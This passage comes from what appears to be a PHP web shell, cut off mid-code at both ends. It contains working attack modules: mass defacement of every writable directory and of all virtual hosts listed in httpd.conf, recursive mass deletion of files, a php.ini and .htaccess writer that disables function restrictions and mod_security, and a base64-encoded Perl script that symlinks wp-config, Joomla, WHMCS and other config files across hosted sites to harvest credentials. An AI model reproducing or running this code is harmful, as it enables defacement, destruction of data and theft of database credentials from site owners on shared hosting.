            foreach($dira as $dirb) {
                $dirc = "$dir/$dirb";
                $lokasi = $dirc.'/'.$namafile;
                if($dirb === '.') {
                    file_put_contents($lokasi, $isi_script);
                } elseif($dirb === '..') {
                    file_put_contents($lokasi, $isi_script);
                } else {
                    if(is_dir($dirc)) {
                        if(is_writable($dirc)) {
                            echo "[<font color=lime>DONE</font>] $dirb/$namafile<br>";
                            file_put_contents($lokasi, $isi_script);
                        }
                    }
                }
            }
        }
    }
    if($_POST['start']) {
        if($_POST['tipe_sabun'] == 'mahal') {
            echo "<div style='margin: 5px auto; padding: 5px'>";
            sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
            echo "</div>";
        } elseif($_POST['tipe_sabun'] == 'murah') {
            echo "<div style='margin: 5px auto; padding: 5px'>";
            sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
            echo "</div>";
        }
    } else {
    echo "<center>";
    echo "<form method='post'>
    <font style='text-decoration: underline;'>Tipe Sabun:</font><br>
    <input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
    <font style='text-decoration: underline;'>Folder:</font><br>
    <input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
    <font style='text-decoration: underline;'>Filename:</font><br>
    <input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
    <font style='text-decoration: underline;'>Index File:</font><br>
    <textarea name='script' style='width: 450px; height: 200px;'>Hacked by pr!v@t3</textarea><br>
    <input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
    </form></center>";
    }
}  elseif($_GET['do'] == 'mass_helper'){
    echo "<center>";
echo "<span style=\"color:lime; font: 14px Comic Sans MS; font-weight:bold;\">Help :<br>1. After u get root, Upload ur deface source as index.txt <br>2. Run this comand on ur CMD / Terminal : <br></span><br/>";
echo "<help>&nbsp;&nbsp;&nbsp;&nbsp;<blink>=></blink><b> cat /etc/httpd/conf/httpd.conf | grep DocumentRoot>dir.txt </b></help><br/>";
echo "<help>&nbsp;&nbsp;&nbsp;&nbsp;<blink>=></blink><b> cat /etc/httpd/conf/httpd.conf | grep ServerName>dmn.txt </b></help><br><br/><br/>";
echo "<form method=POST>
<help title='the file you want to put in all sites'> Def page name : </help>
&nbsp;&nbsp;<input title='the file name you want to put in all sites' type=text name=index value=bie.htm>&nbsp;|
<help title='your deface page's source code'>Def source code :</help>
&nbsp;&nbsp;<input title='your index source code' type='text' name='source' value='index.txt'><br><br>
<help>List DocumentRoot from httpd.conf  : </help><br>
<input type=text name=dirs size=\"40\">
<br><br>
<help>List ServerName from httpd.conf : </help><br>
<input type=text name=sites size=\"40\">
<br><br>
<center><input class='but' type=submit value='Generate ' name='go'></center>
</form>
<br/>";
echo "</center>";
if($_POST['go']){
echo "<b></b>";
$index = $_POST['index'];
$source = $_POST['source'];
$dirs =explode("\n",@dd1(file_get_contents($_POST['dirs'])));
$sites =explode("\n",@dd2(file_get_contents($_POST['sites'])));
 
// preparing perl script
 
if($_POST['dirs']){
 
 
    $perl = fopen ('mass.txt','w+') or die (" WTF !! , i cannot create files o__O");
    $perl_start = "#!/usr/bin/perl";
    $perl_end = "print\"All Defaced !\";";
    fwrite ($perl,$perl_start."\n\n"); // Write !!
 
foreach($dirs as $dir){
 
$result = "system(\"cat ".$source." > ".@kill($dir)."/".$index."\");";
fwrite ($perl, $result."\n");
flush();
}  
    echo "<tr><td><font style='font: 9pt Comic Sans MS; COLOR: #FFFFFF;font-weight:bold;'>perl script <a style='text-decoration: none;color:lime;' href='mass.txt'>mass.txt</a></font></td><td><br>";
    echo "<help>Now run this mass.txt on ur CMD / Terminal <blink>=> </blink> perl mass.txt </help><br>";
    fwrite ($perl, "\n".$perl_end);
    fclose($perl);
   
    }
    // preparing sites list
   
if($_POST['sites']){
 
 
    $sitess = fopen ('sites.txt','w+') or die ("WTF !! , i can't create files o__O");
    $sitess_start = "http://";
    $sitess_end = "/";
    fwrite ($sitess,"");
 
foreach($sites as $site){
 
    $result2 = $sitess_start.@kill($site).$sitess_end.$index;
    fwrite ($sitess, $result2."\n");
    flush();
}
    echo "<br /><tr><td><help>Defaced sites : <a style='text-decoration: none;color:lime;' href='sites.txt'>sites.txt</a></help></td><td><br/><br/>";
    fwrite ($sitess,"");
    fclose($sitess);
 
}
  }
function kill($value){  return str_replace(array("\n","\r"),"",$value); }
function dd1($value){  return str_replace(array("DocumentRoot"," "),"",$value); }
function dd2($value){  return str_replace(array("ServerName"," "),"",$value); }
echo "<br />";
echo "<div class='greetz'><center> Original script by <b>ReZK2LL</center><font></div>";
   
}elseif($_GET['do'] == 'mass_delete') {
	function hapus_massal($dir,$namafile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					if(file_exists("$dir/$namafile")) {
						unlink("$dir/$namafile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namafile")) {
						unlink("".dirname($dir)."/$namafile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								echo "[<font color=lime>DELETED</font>] $lokasi<br>";
								unlink($lokasi);
								$idx = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		hapus_massal($_POST['d_dir'], $_POST['d_file']);
		echo "</div>";
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
	<input type='submit' name='start' value='Mass Delete' style='width: 450px;'>
	</form></center>";
	}
}elseif($_GET['do'] == 'bypass'){
        echo "<center>";
        echo "<form method=post><input type=submit name=ini value='php.ini' />&nbsp;<input type=submit name=htce value='.htaccess' /></form>";
        if(isset($_POST['ini']))
{
        $file = fopen("php.ini","w");
        echo fwrite($file,"disable_functions=none
safe_mode = Off
    ");
        fclose($file);
        echo "<a href='php.ini'>click here!</a>";
}       if(isset($_POST['htce']))
{
        $file = fopen(".htaccess","w");
        echo fwrite($file,"<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>
    ");
        fclose($file);
        echo "htaccess successfully created!";
}
        echo"</center>";
} elseif($_GET['do'] == 'convh')
    {
@mkdir('ecboss', 0755);
@chdir('ecboss');
        $elesem = ".htaccess";
        $elakab = "$elesem";
        $filhat = fopen ($elakab , 'w') or die ("Can't Write htaccess !");
        $htcont = "Options FollowSymLinks MultiViews Indexes ExecCGI
 
AddType application/x-httpd-cgi .ler
 
AddHandler cgi-script .ler
AddHandler cgi-script .ler";  
        fwrite ( $filhat , $htcont ) ;
        fclose ($filhat);
$config = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluCnByaW50ICJDb250ZW50LXR5cGU6IHRleHQvaHRtbFxuXG4iOwpwcmludCc8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIFhIVE1MIDEuMCBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIveGh0bWwxL0RURC94aHRtbDEtdHJhbnNpdGlvbmFsLmR0ZCI+CjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4KCjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LUxhbmd1YWdlIiBjb250ZW50PSJlbi11cyIgLz4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiIC8+Cjx0aXRsZT52SG9zdHMgQ29uZmlnIEdyYWJiZXI8L3RpdGxlPgo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPgoubmV3U3R5bGUxIHsKIGZvbnQtZmFtaWx5OiB1YnVudHU7CiBmb250LXNpemU6IHgtbGFyZ2U7CiBjb2xvcjogd2hpdGU7CiBiYWNrZ3JvdW5kLWNvbG9yOiAjMTUxNTE1OwogdGV4dC1hbGlnbjogY2VudGVyOwp9Cjwvc3R5bGU+CjwvaGVhZD4KJzsKCgpwcmludCAnCjxib2R5IGNsYXNzPSJuZXdTdHlsZTEiPgo8cD4uOiBDb2RlZCBieSBGYWxsYWcgR2Fzc3JpbmkgfCBSZWMwZGVkIGJ5IENvdXJhZ2V1eDwvcD4nOwpvcGVuZGlyKG15ICRkaXIgLCAiL3Zhci93d3cvdmhvc3RzLyIpOwpmb3JlYWNoKHNvcnQgcmVhZGRpciAkZGlyKSB7CiAgICBteSAkaXNEaXIgPSAwOwogICAgJGlzRGlyID0gMSBpZiAtZCAkXzsKJHNpdGVzcyA9ICRfOwoKCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkc2l0ZXNzLictc2hvcC50eHQnKTsKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL29zL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zaG9wLW9zLnR4dCcpOwpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvb3Njb20vaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLW9zY29tLnR4dCcpOwpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvb3Njb21tZXJjZS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkc2l0ZXNzLictb3Njb21tZXJjZS50eHQnKTsKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL29zY29tbWVyY2VzL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1vc2NvbW1lcmNlcy50eHQnKTsKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Nob3AvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNob3AyLnR4dCcpOwpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2hvcHBpbmcvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNob3Atc2hvcHBpbmcudHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zYWxlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zYWxlLnR4dCcpOwpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYW1lbWJlci9jb25maWcuaW5jLnBocCcsJHNpdGVzcy4nLWFtZW1iZXIudHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jb25maWcuaW5jLnBocCcsJHNpdGVzcy4nLWFtZW1iZXIyLnR4dCcpOwpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbWVtYmVycy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLW1lbWJlcnMudHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jb25maWcucGhwJywkc2l0ZXNzLictNGltYWdlczEudHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9mb3J1bS9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictZm9ydW0udHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9mb3J1bXMvaW5jbHVkZXMvY29uZmlnLnBocCcsJHNpdGVzcy4nLWZvcnVtcy50eHQnKTsKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FkbWluL2NvbmYucGhwJywkc2l0ZXNzLictNS50eHQnKTsKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FkbWluL2NvbmZpZy5waHAnLCRzaXRlc3MuJy00LnR4dCcpOwpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLXdwMTMudHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93cC93cC1jb25maWcucGhwJywkc2l0ZXNzLictd3AxMy13cC50eHQnKTsKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL1dQL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy13cDEzLVdQLnR4dCcpOwpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd3AvYmV0YS93cC1jb25maWcucGhwJywkc2l0ZXNzLictd3AxMy13cC1iZXRhLnR4dCcpOwpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYmV0YS93cC1jb25maWcucGhwJywkc2l0ZXNzLictd3AxMy1iZXRhLnR4dCcpOwpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvcHJlc3Mvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLXdwMTMtcHJlc3MudHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93b3JkcHJlc3Mvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLXdwMTMtd29yZHByZXNzLnR4dCcpOwpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvV29yZHByZXNzL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy13cDEzLVdvcmRwcmVzcy50eHQnKTsKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2Jsb2cvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLXdwMTMtV29yZHByZXNzLnR4dCcpOwpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd29yZHByZXNzL2JldGEvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLXdwMTMtd29yZHByZXNzLWJldGEudHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9uZXdzL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy13cDEzLW5ld3MudHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9uZXcvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLXdwMTMtbmV3LnR4dCcpOwpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYmxvZy93cC1jb25maWcucGhwJywkc2l0ZXNzLictd3AtYmxvZy50eHQnKTsKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2JldGEvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLXdwLWJldGEudHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ibG9ncy93cC1jb25maWcucGhwJywkc2l0ZXNzLictd3AtYmxvZ3MudHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ob21lL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy13cC1ob21lLnR4dCcpOwpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvcHJvdGFsL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy13cC1wcm90YWwudHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaXRlL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy13cC1zaXRlLnR4dCcpOwpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbWFpbi93cC1jb25maWcucGhwJywkc2l0ZXNzLictd3AtbWFpbi50eHQnKTsKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Rlc3Qvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLXdwLXRlc3QudHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hcmNhZGUvZnVuY3Rpb25zL2RiY2xhc3MucGhwJywkc2l0ZXNzLictaWJwcm9hcmNhZGUudHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hcmNhZGUvZnVuY3Rpb25zL2RiY2xhc3MucGhwJywkc2l0ZXNzLictaWJwcm9hcmNhZGUudHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9qb29tbGEvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEyLnR4dCcpOwpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvcHJvdGFsL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLXByb3RhbC50eHQnKTsKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2pvby9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWpvby50eHQnKTsKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2Ntcy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWpvb21sYS1jbXMudHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaXRlL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLXNpdGUudHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tYWluL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLW1haW4udHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9uZXdzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLW5ld3MudHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9uZXcvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtbmV3LnR4dCcpOwpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaG9tZS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWpvb21sYS1ob21lLnR4dCcpOwpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvdmIvaW5jbHVkZXMvY29uZmlnLnBocCcsJHNpdGVzcy4nLXZifmNvbmZpZy50eHQnKTsKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3ZiMy9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdmIzfmNvbmZpZy50eHQnKTsKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NjL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy12YjF+Y29uZmlnLnR4dCcpOwpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaW5jbHVkZXMvY29uZmlnLnBocCcsJHNpdGVzcy4nLWluY2x1ZGVzLXZiLnR4dCcpOwpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvZm9ydW0vaW5jbHVkZXMvY2xhc3NfY29yZS5waHAnLCRzaXRlc3MuJy12Ymx1dHRpbn5jbGFzc19jb3JlLnBocC50eHQnKTsKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3ZiL2luY2x1ZGVzL2NsYXNzX2NvcmUucGhwJywkc2l0ZXNzLictdmJsdXR0aW5+Y2xhc3NfY29yZS5waHAxLnR4dCcpOwpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY2MvaW5jbHVkZXMvY2xhc3NfY29yZS5waHAnLCRzaXRlc3MuJy12Ymx1dHRpbn5jbGFzc19jb3JlLnBocDIudHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93aG0vY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0xNS50eHQnKTsKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NlbnRyYWwvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0tY2VudHJhbC50eHQnKTsKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobS93aG1jcy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobS13aG1jcy50eHQnKTsKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobS9XSE1DUy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobS1XSE1DUy50eHQnKTsKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobWMvV0hNL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htYy1XSE0udHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93aG1jcy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobWNzLnR4dCcpOwpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc3VwcG9ydC9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXN1cHBvcnQudHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VwcC50eHQnKTsKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3NlY3VyZS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXN1Y3VyZS50eHQnKTsKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3NlY3VyZS93aG0vY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1zdWN1cmUtd2htLnR4dCcpOwpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2VjdXJlL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VjdXJlLXdobWNzLnR4dCcpOwpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY3BhbmVsL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictY3BhbmVsLnR4dCcpOwpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvcGFuZWwvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1wYW5lbC50eHQnKTsKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3QvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1ob3N0LnR4dCcpOwpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaG9zdGluZy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWhvc3RpbmcudHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ob3N0cy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWhvc3RzLnR4dCcpOwpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEudHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdWJtaXR0aWNrZXQucGhwJywkc2l0ZXNzLictd2htY3MyLnR4dCcpOwpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY2xpZW50cy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWNsaWVudHMudHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnQvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnQudHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnRlcy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWNsaWVudGVzLnR4dCcpOwpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY2xpZW50ZS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWNsaWVudC50eHQnKTsKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NsaWVudHN1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnRzdXBwb3J0LnR4dCcpOwpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYmlsbGluZy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWJpbGxpbmcudHh0Jyk7IApzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbWFuYWdlL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htLW1hbmFnZS50eHQnKTsgCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9teS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobS1teS50eHQnKTsgCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9teXNob3AvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0tbXlzaG9wLnR4dCcpOyAKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXplbmNhcnQudHh0Jyk7IApzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvemVuY2FydC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zaG9wLXplbmNhcnQudHh0Jyk7IApzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2hvcC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zaG9wLVpDc2hvcC50eHQnKTsgCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9TZ